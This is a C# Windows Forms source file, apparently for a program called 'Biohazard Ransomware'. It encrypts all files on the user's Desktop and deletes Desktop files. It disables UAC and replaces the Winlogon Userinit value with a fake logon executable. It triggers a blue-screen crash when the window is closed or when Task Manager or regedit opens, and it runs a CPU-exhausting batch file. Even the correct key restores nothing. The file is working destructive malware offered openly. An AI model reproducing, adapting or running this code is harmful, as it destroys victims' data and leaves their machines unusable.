using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Biohazard.ChangeWallpaper;
using Biohazard.CommandLine;
using Biohazard.MsgBoxPayload;
using Biohazard.PowerShellCommandLine;
using Biohazard.RegistryEdit;
using Biohazard.SetHardError;
using Biohazard.SoundMusicPayload;
using BiohazardRansPayload.EncryptFiles;
using Biohazard.DesktopDeleteFiles;
using Biohazard.Payload.CPUEater;
using System.Diagnostics;
using Microsoft.Win32;

namespace BiohazardRansomware
{
    public partial class BiohazardMainForm : Form
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //This is Very Important Code... DON'T CHANGE THIS!!! 

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public BiohazardMainForm()
        {
            BiohazardDeleteFilesDesktop delete = new BiohazardDeleteFilesDesktop();
            RegEditor reg = new RegEditor();
            reg.DisableLUA();
            reg.NoAdminRequiredLUA();
            Encrypt();
            delete.DeleteFilesDesktop();
            InitializeComponent();
            this.Hide();
            Directory.CreateDirectory(@"C:\Temp");
            string temp_folder = @"C:\Temp";
            Extract("BiohazardRansomware", temp_folder, "Resources", "BiohazardAlarm.wav");
            Extract("BiohazardRansomware", temp_folder, "Resources", "BiohazardMusic.wav");
            Extract("BiohazardRansomware", temp_folder, "Resources", "BiohazardLogOnUIFake.exe");
            Extract("BiohazardRansomware", temp_folder, "Resources", "BiohazardRans.jpg");
            Extract("BiohazardRansomware", temp_folder, "Resources", "BiohazardCPUEater.bat");
            string soft = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
            RegistryKey loc = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey xxx = loc.OpenSubKey(soft, true);
            xxx.DeleteValue("Userinit");
            xxx.SetValue("Userinit", @"C:\Temp\BiohazardLogOnUIFake.exe", RegistryValueKind.String);
            randomcolorlabel1.Enabled = false;
            this.label1.ForeColor = Color.Lime;
            Thread.Sleep(5000);
            BiohazardSoundPlayload sound = new BiohazardSoundPlayload();
            sound.SoundPayload(@"C:\Temp\BiohazardAlarm.wav");
            BIOWallpaper xzaller = new BIOWallpaper();
            xzaller.ChangeWallpaper();
            var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
            Thread.Sleep(23000);
            sound.StopMusic(@"C:\Temp\BiohazardAlarm.wav");
            this.Show();
            randomcolorlabel1.Enabled = true;
            sound.MusicPayload(@"C:\Temp\BiohazardMusic.wav");
            CPUEater cpu = new CPUEater();
            cpu.CPUEaterBatchfile();
        }

        private void BiohazardMainForm_Load(object sender, EventArgs e)
        {
            this.biohazardgreen.BackColor = Color.Transparent;
        }

        private void randomcolorlabel1_Tick(object sender, EventArgs e)
        {
            randomcolorlabel1.Stop();
            this.label1.ForeColor = Color.Red;
            rndcolorlabel1.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(keybox.Text == "")
            {
                MessageBox.Show("Key is Wrong", "Biohazard Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if(keybox.Text == "JXSOL192CANZAMKA12239210CX")
            {
                MessageBox.Show("Key is Correct, but ur PC is Already Gone!!!", "Biohazard Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                Environment.Exit(223);
            }
            else
            {
                MessageBox.Show("Key is Wrong", "Biohazard Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void rndcolorlabel1_Tick(object sender, EventArgs e)
        {
            rndcolorlabel1.Stop();
            label1.ForeColor = Color.Lime;
            randomcolorlabel1.Start();
        }

        private void BiohazardMainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            HardErrorBSOD hard = new HardErrorBSOD();
            hard.BSOD(0xC0000350);
        }
        public void Encrypt()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] files = Directory.GetFiles(path + @"\", "*", SearchOption.AllDirectories);

            BiohazardRansEncrPayload enc = new BiohazardRansEncrPayload();

            string password = "JXSOL192CANZAMKA12239210CX"; //this is password to decrypt your files :D
            for (int i = 0; i < files.Length; i++)
            {
                enc.FileEncrypt(files[i], password);
            }
        }

        private void randommsg1_Tick(object sender, EventArgs e)
        {
            MessageBpayload bpl = new MessageBpayload();
            randommsg1.Stop();
            bpl.MessagePayload();
            randommsg2.Start();
        }

        private void randommsg2_Tick(object sender, EventArgs e)
        {
            MessageBpayload bpl = new MessageBpayload();
            randommsg2.Stop();
            bpl.MessagePayload();
            randommsg1.Start();
        }

        private void check_badprocesses_Tick(object sender, EventArgs e)
        {
            check_badprocesses.Stop();
            Process[] tsk = Process.GetProcessesByName("taskmgr");
            if (tsk.Length == 1)
            {
                HardErrorBSOD hard = new HardErrorBSOD();
                hard.BSOD(0xC0000350);
            }
            Process[] regedit = Process.GetProcessesByName("regedit");
            if(regedit.Length == 1)
            {
                HardErrorBSOD hard = new HardErrorBSOD();
                hard.BSOD(0xC0000350);
            }
            check_badprocesses.Start();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Process.Start("https://ko-fi.com/K3K77259H");
        }

        private void whatshappening_Click(object sender, EventArgs e)
        {
            File.WriteAllText(@"C:\Temp\WhatsHappening.txt", "Ur Been Infected by Biohazard Ransomware" + Environment.NewLine + "Don't Even try to Close this Ransomware, otherwise BSOD and Goodbye PC :D" + Environment.NewLine + "Good Luck!!!");
            Process.Start("notepad", @"C:\Temp\WhatsHappening.txt");
        }
    }
}
